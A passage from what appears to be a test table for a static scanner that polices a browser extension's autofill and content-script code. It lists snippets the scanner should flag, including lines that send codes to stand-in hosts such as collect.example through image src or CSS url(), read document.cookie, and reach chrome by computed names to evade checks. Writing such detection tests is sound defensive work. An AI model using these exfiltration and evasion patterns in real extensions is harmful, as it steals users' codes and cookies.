  ['nav-tabs-create-in-background', appendJs('background.js', "chrome.tabs.create({ url: chrome.runtime.getURL('popup/popup.html#unlock') });\n"), ['navigation']],
  ['nav-tabs-update-in-worker', appendJs('lib/autofill-worker.js', 'export const go = (tab, u) => chrome.tabs.update(tab.id, { url: u });\n'), ['navigation']],
  [
    'nav-wrapper-symlink',
    (fx) => {
      delete fx.files['lib/nav.js'];
      fx.files['lib/nav-real.js'] = NAV_WRAPPER_SOURCE;
      fx.symlinks['lib/nav.js'] = 'nav-real.js';
    },
    ['file-types', 'navigation', 'nav-wrapper'],
    /not a regular file/,
  ],
  ['nav-set-uninstall-url', addJs('lib/x.js', 'chrome.runtime.setUninstallURL(chrome.runtime.getManifest().homepage_url);\n'), ['navigation']],
  ['nav-in-comment', addJs('lib/x.js', '// do not call window.open(url) here\n'), ['navigation']],
  // The global object, under any of its names, only as <name>.<member>: a computed access on it,
  // the object as a value (an alias, an argument, a destructuring source) or Reflect would reach
  // chrome by a computed name, past every check that reads chrome.<api> by its spelling.
  [
    'global-worker-leak',
    appendJs(
      'lib/autofill-worker.js',
      "const c = 'chr' + 'ome', f = 'fu' + 'nc';\nfunction grab(code) { document.querySelector('img').src = '//example.com/?code=' + code; }\nexport function leak(tabId) {\n  const o = { target: { tabId } };\n  o[f] = grab;\n  return globalThis[c].scripting.executeScript(o);\n}\n",
    ),
    ['navigation'],
    /globalThis other than as globalThis\.<member> \(a computed access on the global object/,
  ],
  [
    'global-settings-tabs-scripting-permissions',
    appendJs('popup/settings.js', "const c = 'chr' + 'ome';\nexport const probe = (u, o) => { globalThis[c].tabs.create({ url: u }); globalThis[c].scripting.executeScript(o); globalThis[c].permissions.request(o); };\n"),
    ['navigation'],
    /globalThis other than as globalThis\.<member> \(a computed access/,
  ],
  ['global-reflect-get', appendJs('popup/settings.js', "const c = 'chr' + 'ome';\nexport const api = () => Reflect.get(globalThis, c);\n"), ['navigation'], /Reflect \(it reaches/],
  // Each part alone: Reflect with no global name, and the global object as an argument.
  ['global-reflect-alone', appendJs('popup/settings.js', 'export const read = (o, k) => Reflect.get(o, k);\n'), ['navigation'], /Reflect \(it reaches/],
  ['global-object-values', appendJs('popup/settings.js', 'export const all = () => Object.values(globalThis);\n'), ['navigation'], /globalThis other than as globalThis\.<member> \(the global object as a value/],
  ['global-self-alias', appendJs('popup/settings.js', "const c = 'chr' + 'ome';\nconst g = self;\nexport const api = () => g[c];\n"), ['navigation'], /self other than as self\.<member> \(the global object as a value/],
  ['global-destructure-assignment', appendJs('popup/settings.js', 'let x;\n({ chrome: x } = globalThis);\n'), ['navigation'], /globalThis other than as globalThis\.<member> \(the global object as a value/],
  ['global-computed-destructure', appendJs('popup/settings.js', "const c = 'chr' + 'ome';\nconst { [c]: x } = self;\n"), ['navigation'], /self other than as self\.<member> \(the global object as a value/],
  ['global-object-assign', appendJs('popup/settings.js', 'export const copy = () => Object.assign({}, window);\n'), ['navigation'], /window other than as window\.<member>/],
  ['global-get-own-property-descriptor', appendJs('popup/settings.js', 'export const api = (c) => Object.getOwnPropertyDescriptor(top, c).value;\n'), ['navigation'], /top other than as top\.<member>/],
  ['global-optional-computed', appendJs('popup/settings.js', 'export const api = (c) => globalThis?.[c];\n'), ['navigation'], /globalThis other than as globalThis\.<member> \(a computed access/],
  ['global-parenthesized', appendJs('popup/settings.js', 'export const api = (c) => (globalThis)[c];\n'), ['navigation'], /globalThis other than as globalThis\.<member> \(the global object as a value/],
  ['global-shorthand-property', appendJs('popup/settings.js', 'export const box = { window };\n'), ['navigation'], /window other than as window\.<member>/],
  ['global-frames-opener-computed', appendJs('popup/settings.js', 'export const api = (c) => [frames[c], opener[c]];\n'), ['navigation'], /opener other than as opener\.<member> \(a computed access/],
  // After a '.', too: window.self, window.window and the like are the global object again.
  ['global-dotted-computed', appendJs('popup/settings.js', 'export const api = (c) => window.self[c];\n'), ['navigation'], /\.self other than as \.self\.<member> \(a computed access/],
  ['global-dotted-alias', appendJs('popup/settings.js', 'const g = window.window;\n'), ['navigation'], /\.window other than as \.window\.<member> \(the global object as a value/],
  // A local `const parent = ...` may be read bare in its own block, after its declaration; not a
  // for-of variable, not from another function, and never with a computed access.
  ['global-parent-for-of', appendJs('popup/settings.js', 'for (const parent of list) {}\nconst g = parent;\n'), ['navigation'], /parent other than as parent\.<member> \(the global object as a value/],
  [
    'global-parent-other-function',
    appendJs('popup/settings.js', 'function a(el) {\n  const parent = el.parentElement;\n  return parent;\n}\nfunction b() {\n  const g = parent;\n  return [a, g];\n}\n'),
    ['navigation'],
    /settings\.js:\d+ parent other than as parent\.<member> \(the global object as a value/,
  ],
  ['global-parent-local-computed', appendJs('popup/settings.js', 'export function a(el, c) {\n  const parent = el.parentElement;\n  return parent[c];\n}\n'), ['navigation'], /parent other than as parent\.<member> \(a computed access/],
  [
    'ok-global-members-and-local-parent',
    appendJs(
      'popup/settings.js',
      'export const shut = () => window.close();\nconst key = globalThis.crypto?.subtle;\nexport function groupOf(el) {\n  const parent = el.parentElement;\n  if (parent && parent.parentElement) return parent.parentElement;\n  return parent || key;\n}\n',
    ),
    [],
  ],
  // Fails closed: a file it cannot read is a hit. An escape inside a string is readable.
  ['global-escaped-identifier', appendJs('popup/settings.js', 'export const api = (c) => wind\\u006fw[c];\n'), ['navigation'], /cannot be read for global-object access/],
  ['ok-global-string-escape', appendJs('popup/settings.js', "export const dot = '\\u00b7';\n"), []],

  // chrome.scripting: lib/autofill-worker.js only, by path, any reference.
  ['scripting-in-popup', appendJs('popup/popup.js', 'chrome.scripting.executeScript({ target: { tabId: 1 }, func: () => 0 });\n'), ['scripting-api']],
  ['scripting-in-settings', appendJs('popup/settings.js', "chrome.scripting.unregisterContentScripts({ ids: ['autofill'] });\n"), ['scripting-api']],
  ['scripting-in-background', appendJs('background.js', 'chrome.scripting.registerContentScripts([]);\n'), ['scripting-api']],
  ['scripting-in-content-script', appendJs('content/autofill.js', 'chrome.scripting.getRegisteredContentScripts();\n'), ['scripting-api', 'content-script-sinks'], /chrome other than/],
  ['scripting-in-nav', (fx) => (fx.files['lib/nav.js'] = `${NAV_WRAPPER_SOURCE}chrome.scripting.executeScript(o);\n`), ['scripting-api', 'nav-wrapper']],
  ['scripting-alias', addJs('lib/x.js', 'const s = chrome.scripting;\ns.executeScript(o);\n'), ['scripting-api']],
  ['scripting-optional-chain', addJs('lib/x.js', 'chrome?.scripting?.executeScript(o);\n'), ['scripting-api']],
  ['scripting-computed', addJs('lib/x.js', "chrome.scripting['executeScript'](o);\n"), ['scripting-api']],
  ['scripting-spaced-comment', addJs('lib/x.js', 'chrome.scripting /* x */ .executeScript(o);\n'), ['scripting-api']],
  ['scripting-in-comment', addJs('lib/x.js', '// chrome.scripting.executeScript is for the worker\n'), ['scripting-api']],
  ['scripting-in-html', addHtml('<!-- chrome.scripting.executeScript -->'), ['scripting-api']],
  // The exemption is the path lib/autofill-worker.js, not the content.
  ['scripting-worker-copy-elsewhere', (fx) => (fx.files['lib/autofill-worker-copy.js'] = WORKER_SOURCE), ['scripting-api', 'permissions-api']],
  ['scripting-worker-other-dir', (fx) => (fx.files['popup/autofill-worker.js'] = WORKER_SOURCE), ['scripting-api', 'permissions-api']],
  // chrome.permissions: free in the worker and popup/popup.js; elsewhere only
  // contains, onAdded and onRemoved.
  ['ok-permissions-events-anywhere', appendJs('lib/store.js', 'chrome.permissions.onAdded.addListener(() => {});\nchrome.permissions?.contains({ origins: [] });\n'), []],
  ['permissions-request-in-list', appendJs('popup/list.js', "chrome.permissions.request({ origins: ['<all_urls>'] });\n"), ['permissions-api']],
  // Settings removes a binding through the vault; the worker then gives up the site's access.
  ['permissions-remove-in-settings', appendJs('popup/settings.js', 'chrome.permissions.remove({ origins: [o] });\n'), ['permissions-api']],
  ['permissions-request-in-settings', appendJs('popup/settings.js', 'chrome.permissions.request({ origins: [o] });\n'), ['permissions-api']],
  ['permissions-remove-in-background', appendJs('background.js', 'chrome.permissions.remove({ origins: [o] });\n'), ['permissions-api']],
  ['permissions-getall-in-session', appendJs('popup/session.js', 'export const all = () => chrome.permissions.getAll();\n'), ['permissions-api']],
  ['permissions-request-in-content-script', appendJs('content/autofill.js', "chrome.permissions.request({ origins: ['<all_urls>'] });\n"), ['permissions-api', 'content-script-sinks'], /chrome other than/],
  ['permissions-request-in-nav', (fx) => (fx.files['lib/nav.js'] = `${NAV_WRAPPER_SOURCE}chrome.permissions.request(o);\n`), ['permissions-api', 'nav-wrapper']],
  ['permissions-host-access-request', addJs('lib/x.js', 'chrome.permissions.addHostAccessRequest({ tabId: 1 });\n'), ['permissions-api']],
  ['permissions-alias', addJs('lib/x.js', 'const p = chrome.permissions;\np.request(o);\n'), ['permissions-api']],
  ['permissions-computed', addJs('lib/x.js', "chrome.permissions['request'](o);\n"), ['permissions-api']],
  ['permissions-optional-chain', addJs('lib/x.js', 'chrome?.permissions?.request(o);\n'), ['permissions-api']],
  ['permissions-in-comment', addJs('lib/x.js', '// chrome.permissions.remove is for the worker\n'), ['permissions-api']],
  // The content script runs in web pages, outside the extension-page CSP: every source rule
  // applies to it as to any other file, and content-script-sinks on top. Each case below that
  // also breaks the content-script lists says which part of them it breaks.
  ['content-fetch', appendContent("fetch('/collect', { method: 'POST', body: field.value });\n"), ['network-api', 'content-script-sinks'], /fetch in a content script/],
  ['content-sendbeacon', appendContent("navigator.sendBeacon('/collect', field.value);\n"), ['network-api', 'content-script-sinks'], /\.sendBeacon is not on/],
  ['content-websocket', appendContent("export const w = new WebSocket('wss://x');\n"), ['network-api', 'content-script-sinks'], /new WebSocket \(/],
  ['content-eval', appendContent('eval(field.value);\n'), ['dynamic-code', 'content-script-sinks'], /eval in a content script/],
  ['content-string-timer', appendContent("setTimeout('fill()', 10);\n"), ['dynamic-code', 'content-script-sinks'], /setTimeout whose first argument/],
  // An absolute URL is the remote-url rule's; content-script-sinks adds no second finding for it.
  ['content-url-string', appendContent("const collector = 'https://collect.example/';\n"), ['remote-url']],
  ['content-location-assign', appendContent("location.href = '/next';\n"), ['navigation', 'content-script-sinks'], /\.href is not on/],
  ['content-window-open', appendContent("window.open('/x');\n"), ['navigation', 'content-script-sinks'], /\.open is not on/],
  ['content-frame-in-string', appendContent("document.body.insertAdjacentHTML('beforeend', '<iframe src=\"/x\"></iframe>');\n"), ['navigation', 'content-script-sinks'], /\.insertAdjacentHTML is not on/],

  // content-script-sinks: what the content script may touch, by allowlist. Loading something
  // from the page: an element that loads, a URL-taking property or attribute, markup, a style
  // with url(, a worker, a dynamic import.
  ['content-new-image-src', appendContent("new Image().src = '//collect.example/p?c=' + code;\n"), ['content-script-sinks'], /new Image \(a content script constructs only/],
  ...['img', 'script', 'link', 'iframe'].map((tag) => [`content-create-element-${tag}`, appendContent(`const el2 = document.createElement('${tag}');\n`), ['content-script-sinks'], /\.createElement is not on/]),
  ...['src', 'href', 'srcset', 'action', 'data', 'poster', 'background'].map((prop) => [
    `content-set-${prop}`,
    appendContent(`field.${prop} = u;\n`),
    ['content-script-sinks'],
    new RegExp(`\\.${prop} is not on the content-script member list`),
  ]),
  ['content-setattribute-src', appendContent("field.setAttribute('src', u);\n"), ['content-script-sinks'], /\.setAttribute is not on/],
  ['content-setattribute-href', appendContent("field.setAttribute('href', u);\n"), ['content-script-sinks'], /names a URL or markup sink/],
  ['content-insertadjacenthtml', appendContent("field.insertAdjacentHTML('afterend', '<img src=x>');\n"), ['content-script-sinks'], /\.insertAdjacentHTML is not on/],
  ['content-innerhtml', appendContent("field.parentElement.innerHTML = '<img src=x>';\n"), ['content-script-sinks'], /\.innerHTML is not on/],
  ['content-outerhtml', appendContent('field.outerHTML = markup;\n'), ['content-script-sinks'], /\.outerHTML is not on/],
  ['content-document-write', appendContent("document.write('<img src=x>');\n"), ['content-script-sinks'], /\.write is not on/],
  ['content-style-background-image', appendContent("field.style.backgroundImage = 'url(/p)';\n"), ['content-script-sinks'], /\.backgroundImage is not on/],
  ['content-style-csstext', appendContent("field.style.cssText = 'background: url(/p)';\n"), ['content-script-sinks'], /\.cssText is not on/],
  ['content-link-prefetch', appendContent("const l = document.createElement('link');\nl.rel = 'prefetch';\nl.href = '/p';\ndocument.head.append(l);\n"), ['content-script-sinks'], /\.append is not on/],
  ['content-dynamic-import', appendContent("import('/x.js');\n"), ['content-script-sinks'], /import in a content script/],
  ['content-worker', appendContent("new Worker('/w.js');\n"), ['content-script-sinks'], /new Worker \(/],
  ['content-shared-worker', appendContent("new SharedWorker('/w.js');\n"), ['content-script-sinks'], /new SharedWorker \(/],
  // Handing data to another site: postMessage (the parent, top or opener of a bound frame may be
  // another site) and window.name (kept across navigation to another site).
  ['content-postmessage-parent', appendContent("parent.postMessage(code, '*');\n"), ['content-script-sinks'], /\.postMessage is not on/],
  ['content-postmessage-top', appendContent("window.top.postMessage({ code }, '*');\n"), ['content-script-sinks'], /\.postMessage is not on/],
  ['content-postmessage-bare', appendContent("postMessage(code, '*');\n"), ['content-script-sinks'], /postMessage in a content script/],
  ['content-window-name', appendContent('window.name = code;\n'), ['content-script-sinks'], /\.name is not on/],
  ['content-bare-name', appendContent('name = code;\n'), ['content-script-sinks'], /window\.name/],
  // chrome: only chrome.runtime.sendMessage and chrome.runtime.id.
  ['content-chrome-connect', appendContent('chrome.runtime.connect().postMessage(code);\n'), ['content-script-sinks'], /chrome other than/],
  ['content-chrome-storage', appendContent("chrome.storage.local.get('vault');\n"), ['content-script-sinks'], /chrome other than/],
  ['content-chrome-geturl', appendContent("const page = chrome.runtime.getURL('popup/popup.html');\n"), ['content-script-sinks'], /chrome other than/],
  ['content-chrome-optional-chain', appendContent('chrome?.runtime?.connect();\n'), ['content-script-sinks'], /chrome other than/],
  // Other spellings of a member, and calls the member list cannot see.
  ['content-computed-string-key', appendContent("field['src'] = u;\n"), ['content-script-sinks'], /computed member access with a string key/],
  ['content-computed-concat-key', appendContent("field['sr' + 'c'] = u;\n"), ['content-script-sinks'], /computed member access with a string key/],
  ['content-computed-template-key', appendContent('field[`src`] = u;\n'), ['content-script-sinks'], /computed member access with a string key/],
  ['content-computed-call', appendContent('field[method](u);\n'), ['content-script-sinks'], /computed member call/],
  ['content-optional-member', appendContent("field?.setAttribute('srcset', u);\n"), ['content-script-sinks'], /\.setAttribute is not on/],
  ['content-comment-between', appendContent('field /* x */ .src = u;\n'), ['content-script-sinks'], /\.src is not on/],
  ['content-newline-between', appendContent('field\n  .src = u;\n'), ['content-script-sinks'], /\.src is not on/],
  // What the tokenizer cannot read also fails the global-object scan (navigation), which reads every .js file.
  ['content-escaped-identifier', appendContent('field.\\u0073rc = u;\n'), ['navigation', 'content-script-sinks'], /backslash outside a string/],
  ['content-string-escape', appendContent("const key = '\\x73rc';\nfield[key] = u;\n"), ['content-script-sinks'], /escape \\x in a string/],
  ['content-sink-name-string', appendContent("const key = 'src';\nfield[key] = u;\n"), ['content-script-sinks'], /"src" names a URL or markup sink/],
  // A line comment ends at U+2028 as at '\n': what follows on the same line is code.
  ['content-line-separator-ends-comment', appendContent(`// note${String.fromCharCode(0x2028)}field.src = u;\n`), ['content-script-sinks'], /\.src is not on/],
  ['content-number-member', appendContent("1..constructor.constructor('return 1')();\n"), ['content-script-sinks'], /\.constructor is not on/],
  ['content-template-substitution', appendContent('const shown = `${field.src}`;\n'), ['content-script-sinks'], /\.src is not on/],
  ['content-new-alias', appendContent('const Pic = Image;\nnew Pic();\n'), ['content-script-sinks'], /new Pic \(/],
  ['content-function-call', appendContent("Function('return 1')();\n"), ['content-script-sinks'], /Function in a content script/],
  ['content-indirect-eval', appendContent('(0, eval)(code);\n'), ['content-script-sinks'], /eval in a content script/],
  ['content-with-statement', appendContent("with (document) { write('x'); }\n"), ['content-script-sinks'], /with in a content script/],
  ['content-timer-variable', appendContent('setTimeout(code, 10);\n'), ['content-script-sinks'], /setTimeout whose first argument is not a function/],
  ['content-timer-alias', appendContent('const later = setInterval;\n'), ['content-script-sinks'], /setInterval other than called directly/],
  // A property named without a '.': object destructuring, in a declaration, an assignment or a
  // parameter list. Also the attribute nodes, whose value is the attribute's (an existing src).
  ['content-destructure-write', appendContent("const { write } = document;\n['<img src=x>'].forEach(write, document);\n"), ['content-script-sinks'], /object destructuring pattern/],
  ['content-destructure-renamed', appendContent('const { body: page } = document;\n'), ['content-script-sinks'], /object destructuring pattern/],
  ['content-destructure-assignment', appendContent('let w;\n({ write: w } = document);\n'), ['content-script-sinks'], /object destructuring pattern/],
  ['content-destructure-for-of', appendContent('for (const { src } of list) look(src);\n'), ['content-script-sinks'], /object destructuring pattern/],
  ['content-destructure-arrow-param', appendContent("const put2 = ({ insertAdjacentHTML }) => insertAdjacentHTML('afterend', m);\n"), ['content-script-sinks'], /object destructuring pattern/],
  ['content-destructure-function-param', appendContent('function grab({ cookie }) { return cookie; }\n'), ['content-script-sinks'], /object destructuring pattern/],
  ['content-destructure-catch-param', appendContent('try { look(); } catch ({ message }) { look(message); }\n'), ['content-script-sinks'], /object destructuring pattern/],
  ['content-attributes-write', appendContent('Array.from(field.attributes).forEach((a) => { a.value = u; });\n'), ['content-script-sinks'], /\.attributes is not on/],
  // A '/' that may be division or a regular expression is not guessed at: either guess can put
  // later code inside a literal the scan skips.
  ['content-slash-after-paren', appendContent("if (field) /'/.test(code); field.src = u; const q = '/';\n"), ['navigation', 'content-script-sinks'], /'\/' right after '\)'/],
  ['content-slash-after-brace', appendContent('if (code) { look(); } /x/.test(code);\n'), ['content-script-sinks'], /'\/' right after '\}'/],
  ['content-slash-after-of', appendContent('const of = 4;\nconst half = of / 2;\n'), ['navigation', 'content-script-sinks'], /'\/' right after 'of'/],
  ['ok-content-array-destructuring-and-literals', appendContent("const [first, second] = [1, 2];\nconst opts = { once: true, bubbles: false };\nconst half = code.length / 2;\nfunction take(a, [b] = []) { return a + b + first + second + half; }\nwindow.addEventListener('load', look, opts);\n"), []],
  // Acting on the page: other events, clicks and submissions.
  ['content-custom-event', appendContent("field.dispatchEvent(new CustomEvent('x', { detail: code }));\n"), ['content-script-sinks'], /new CustomEvent \(/],
  ['content-event-type', appendContent("field.dispatchEvent(new Event('submit', { bubbles: true }));\n"), ['content-script-sinks'], /new Event\( other than 'input' or 'change'/],
  ['content-event-type-variable', appendContent('field.dispatchEvent(new Event(type));\n'), ['content-script-sinks'], /new Event\( other than/],
  ['content-click', appendContent('button.click();\n'), ['content-script-sinks'], /\.click is not on/],
  ['content-submit', appendContent('form.requestSubmit();\n'), ['content-script-sinks'], /\.requestSubmit is not on/],
  // Strings that are a URL or a style that loads one.
  ['content-protocol-relative-string', appendContent("const beacon = '//collect.example/p';\n"), ['content-script-sinks'], /protocol-relative URL/],
  ['content-css-url-string', appendContent("const css = 'background: url(/p)';\n"), ['content-script-sinks'], /holds a CSS url\(/],
  // What the scan cannot read fails rather than passing unread.
  ['content-unterminated-string', appendContent("const s = 'abc;\n"), ['navigation', 'content-script-sinks'], /unterminated string literal/],
  ['content-unterminated-comment', appendContent('/* never closed\nfield.src = u;\n'), ['navigation', 'content-script-sinks'], /unterminated comment/],
  // Both files are held to it, lib/fieldfind.js as much as content/autofill.js.
  ['content-fieldfind-scanned', appendJs('lib/fieldfind.js', "globalThis.parent.postMessage(1, '*');\n"), ['content-script-sinks'], /fieldfind\.js:\d+ \.parent is not on/],
  // Must stay clean: the listeners, timers and reads the content script may add; sink names in
  // comments and regular expressions; the same sinks outside the content-script files.
  [
    'ok-content-listeners-and-timers',
    appendContent(
      [
        "window.addEventListener('load', () => look(), { once: true });",
        "window.addEventListener('pageshow', (event) => { if (event.persisted) look(); });",
        "document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible' && !document.hidden) schedule(); });",
        "window.addEventListener('resize', schedule);",
        "window.removeEventListener('resize', schedule);",
        'const relook = setInterval(look, 500);',
        'const again = setTimeout(() => look(), 500);',
        'const frame = requestAnimationFrame(() => look());',
        'clearInterval(relook);',
        'clearTimeout(again);',
        'cancelAnimationFrame(frame);',
        "if (document.readyState === 'complete') look();",
        '',
      ].join('\n'),
    ),
    [],
  ],
  [
    'ok-content-dom-reads',
    appendContent(
      [
        'function shown(el) {',
        '  const box = el.getBoundingClientRect();',
        '  const style = getComputedStyle(el);',
        "  return box.width > 0 && box.height > 0 && style.display !== 'none' && style.visibility !== 'hidden';",
        '}',
        'const later = setTimeout(shown, 10);',
        'const ready = () => shown(document);',
        'setInterval(ready, 500);',
        '',
      ].join('\n'),
    ),
    [],
  ],
  [
    'ok-content-sink-names-not-code',
    appendContent("// never set .src, .href, .innerHTML or a style; no new Image(), postMessage, import() or Worker\n/* field.src = '//x'; parent.postMessage(code, '*'); window.name = code */\nconst IGNORED = /src|href|postMessage|url\\(/;\n"),
    [],
  ],
  ['ok-sinks-outside-content-scripts', appendJs('popup/popup.js', "export const preview = (img, u) => { img.src = u; img.setAttribute('srcset', u); };\n"), []],
  // The worker's registration names exactly contentScriptFiles, as a literal list or through one
  // const used nowhere else; any other file, or a list the scan cannot read, fails.
  ['ok-registration-literal-list', editWorker('js: CONTENT_SCRIPTS', "js: ['lib/fieldfind.js', 'content/autofill.js']"), []],
  ['registration-other-file-literal', editWorker('js: CONTENT_SCRIPTS', "js: ['lib/fieldfind.js', 'content/other.js']"), ['content-script-sinks'], /js: names content\/other\.js, not one of contentScriptFiles/],
  ['registration-other-file-const', editWorker("'content/autofill.js'];", "'content/other.js'];"), ['content-script-sinks'], /js: names content\/other\.js, not one of contentScriptFiles/],
  ['registration-extra-file-const', editWorker("'content/autofill.js'];", "'content/autofill.js', 'content/other.js'];"), ['content-script-sinks'], /js: names content\/other\.js/],
  ['registration-quoted-key', editWorker('js: CONTENT_SCRIPTS', "'js': ['content/other.js']"), ['content-script-sinks'], /js: names content\/other\.js/],
  ['registration-const-mutated', appendJs('lib/autofill-worker.js', "CONTENT_SCRIPTS.push('content/other.js');\n"), ['content-script-sinks'], /js: is not a list of string literals/],
  ['registration-computed-list', editWorker('js: CONTENT_SCRIPTS', 'js: CONTENT_SCRIPTS.concat(extra)'), ['content-script-sinks'], /js: is not a list of string literals/],
  ['registration-list-with-variable', editWorker('js: CONTENT_SCRIPTS', "js: ['lib/fieldfind.js', extra]"), ['content-script-sinks'], /js: is not a list of string literals/],
  ['registration-shorthand', editWorker('js: CONTENT_SCRIPTS', 'js'), ['content-script-sinks'], /js named other than as the js: key/],
  ['registration-member-assignment', appendJs('lib/autofill-worker.js', "export function widen(script) { script.js = ['content/other.js']; }\n"), ['content-script-sinks'], /js named other than as the js: key/],
  ['registration-without-js-key', editWorker(', js: CONTENT_SCRIPTS', ''), ['content-script-sinks'], /(?:register|update)ContentScripts without a js: key/],
  ['registration-unreadable', appendJs('lib/autofill-worker.js', 'const broken = `x;\n'), ['navigation', 'content-script-sinks'], /cannot be read/],
  ['content-script-file-missing', (fx) => delete fx.files['lib/fieldfind.js'], ['content-script-sinks'], /missing \(listed in contentScriptFiles\)/],
  // A write to a computed member: refused unless into an object the file made (const x = {},
  // bound nowhere else); a computed read followed by an allowed member stays allowed.
  ['content-computed-assignment', appendContent('field[key] = u;\n'), ['content-script-sinks'], /assignment to a computed member/],
  ['content-computed-compound-assignment', appendContent('field[key] += u;\n'), ['content-script-sinks'], /assignment to a computed member/],
  ['content-computed-logical-assignment', appendContent('field[key] ||= u;\n'), ['content-script-sinks'], /assignment to a computed member/],
  ['content-computed-increment', appendContent('field[key]++;\n'), ['content-script-sinks'], /assignment to a computed member/],
  ['content-computed-assignment-on-member', appendContent('field.attrs[key] = u;\n'), ['content-script-sinks'], /assignment to a computed member/],
  ['content-computed-assignment-on-call', appendContent('finder.findInDocument(document)[0] = u;\n'), ['content-script-sinks'], /assignment to a computed member/],
  ['content-computed-assignment-let-object', appendContent('let bag = {};\nbag[key] = u;\n'), ['content-script-sinks'], /assignment to a computed member/],
  ['content-computed-assignment-shadowed', appendContent('const bag = {};\nfunction keep(bag) { bag[key] = u; }\n'), ['content-script-sinks'], /assignment to a computed member/],
  ['content-computed-assignment-rebound', appendContent('const bag = {};\nfor (const bag of fields) bag[key] = u;\n'), ['content-script-sinks'], /assignment to a computed member/],
  ['ok-content-computed-then-member', appendContent("fields[0].value = code;\nfields[1].value += '';\nconst bag = {};\nbag[key] = code;\nconst other = bag[key];\n"), []],
  // The functions the worker injects with executeScript({ func }) run in the page: held to the
  // content-script lists, by name, and nothing else may be injected (no other func:, no files).
  ['injected-new-image-src', editWorker('function fillFocused(code) {', "function fillFocused(code) {\n  new Image().src = '//collect.example/?c=' + code;"), ['content-script-sinks'], /new Image \(.*\(in injected fillFocused\)/],
  ['injected-postmessage', editWorker('function fillFocused(code) {', "function fillFocused(code) {\n  parent.postMessage(code, '*');"), ['content-script-sinks'], /\.postMessage is not on the content-script member list \(in injected fillFocused\)/],
  ['injected-chrome-api', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  chrome.storage.local.get(null);'), ['content-script-sinks'], /chrome other than .*\(in injected fillFocused\)/],
  ['injected-computed-write', editWorker('  put(el, code);', '  el[key] = code;'), ['content-script-sinks'], /assignment to a computed member \(in injected fillFocused\)/],
  [
    'injected-function-missing',
    (fx) => {
      editWorker('function fillFocused(code) {', 'function fillField(code) {')(fx);
      editWorker('func: fillFocused', 'func: fillField')(fx);
    },
    ['content-script-sinks'],
    /injected function fillFocused not found/,
  ],
  ['injected-function-twice', appendJs('lib/autofill-worker.js', 'function fillFocused(code) { return code; }\n'), ['content-script-sinks'], /injected function fillFocused found 2 times/],
  ['injected-func-other', (fx) => {
    editWorker('func: fillFocused', 'func: grabPage')(fx);
    appendJs('lib/autofill-worker.js', 'function grabPage() { return document.cookie; }\n')(fx);
  }, ['content-script-sinks'], /func: grabPage is not one of injectedFunctions/],
  ['injected-func-arrow', editWorker('func: fillFocused', 'func: () => document.cookie'), ['content-script-sinks'], /func: \( is not one of injectedFunctions/],
  ['injected-func-shorthand', editWorker('func: fillFocused', 'func'), ['content-script-sinks'], /func named other than as the func: key/],
  ['injected-func-member', appendJs('lib/autofill-worker.js', 'export function widen(options) { options.func = grabPage; }\n'), ['content-script-sinks'], /\.func \(an injection is written/],
  ['injected-executescript-files', appendJs('lib/autofill-worker.js', "export const inject = (tabId) => chrome.scripting.executeScript({ target: { tabId }, files: ['content/autofill.js'] });\n"), ['content-script-sinks'], /files in a scripting file/],
  ['injected-insertcss-files', appendJs('lib/autofill-worker.js', "export const style = (tabId) => chrome.scripting.insertCSS({ target: { tabId }, files: ['popup/popup.css'] });\n"), ['scripting-api', 'content-script-sinks'], /files in a scripting file/],
  // Only the chrome.scripting methods in scriptingMethods, even in the worker: CSS written into a
  // page can load a URL that carries the code (the reviewer's inline-css mutation), so neither
  // insertCSS nor a css: key passes.
  [
    'scripting-insertcss-inline',
    appendJs('lib/autofill-worker.js', "export const style = (tabId, code) => chrome.scripting.insertCSS({ target:{tabId}, css: 'body{background-image:url(//x/?c='+code+')}' });\n"),
    ['scripting-api', 'content-script-sinks'],
    /chrome\.scripting\.insertCSS is not one of scriptingMethods/,
  ],
  ['scripting-removecss', appendJs('lib/autofill-worker.js', 'export const unstyle = (o) => chrome.scripting.removeCSS(o);\n'), ['scripting-api'], /chrome\.scripting\.removeCSS is not one of scriptingMethods/],
  ['scripting-other-method-optional-chain', appendJs('lib/autofill-worker.js', 'export const style = (o) => chrome?.scripting?.insertCSS(o);\n'), ['scripting-api'], /insertCSS is not one of scriptingMethods/],
  ['scripting-alias-in-worker', appendJs('lib/autofill-worker.js', 'const s = chrome.scripting;\nexport const style = (o) => s.insertCSS(o);\n'), ['scripting-api'], /chrome\.scripting used other than as chrome\.scripting\.<method>/],
  // Also a member access spelled with a string, which no scripting file may write.
  ['scripting-computed-in-worker', appendJs('lib/autofill-worker.js', "export const style = (o) => chrome.scripting['insertCSS'](o);\n"), ['scripting-api', 'content-script-sinks'], /chrome\.scripting used other than as chrome\.scripting\.<method>/],
  ['scripting-destructure-in-worker', appendJs('lib/autofill-worker.js', 'const { insertCSS } = chrome.scripting;\n'), ['scripting-api'], /chrome\.scripting used other than/],
  // A comment between chrome.scripting and the method hides the member from the raw-text scan.
  ['scripting-comment-before-dot-in-worker', appendJs('lib/autofill-worker.js', 'export const style = (o) => chrome.scripting /* x */ .insertCSS(o);\n'), ['scripting-api'], /chrome\.scripting\.insertCSS is not one of scriptingMethods/],
  ['scripting-comment-after-dot-in-worker', appendJs('lib/autofill-worker.js', 'export const style = (o) => chrome.scripting./* x */insertCSS(o);\n'), ['scripting-api'], /chrome\.scripting\.insertCSS is not one of scriptingMethods/],
  ['scripting-line-comment-in-worker', appendJs('lib/autofill-worker.js', 'export const unstyle = (o) => chrome.scripting // x\n  .removeCSS(o);\n'), ['scripting-api'], /chrome\.scripting\.removeCSS is not one of scriptingMethods/],
  ['ok-scripting-method-after-comment-in-worker', appendJs('lib/autofill-worker.js', 'export const ids = () => chrome.scripting /* list */ .getRegisteredContentScripts();\n'), []],
  ['scripting-css-key-in-registration', editWorker('js: CONTENT_SCRIPTS', "js: CONTENT_SCRIPTS, css: ['popup/popup.css']"), ['content-script-sinks'], /css in a scripting file/],
  ['scripting-css-member-in-worker', appendJs('lib/autofill-worker.js', "export function widen(script) { script.css = ['popup/popup.css']; }\n"), ['content-script-sinks'], /css in a scripting file/],
  // A worker comment may name chrome.scripting without a method (the real one does).
  ['ok-scripting-bare-in-worker-comment', editWorker('// Context menu, codes for bound sites, script registration.', '// Context menu, codes for bound sites; fillFocused() is serialized by chrome.scripting and runs in the frame.'), []],
  // The injected function is the one top-level declaration of its name; nothing else in the file
  // may assign, redeclare or shadow it, or func: would serialize other code.
  [
    'injected-reassigned',
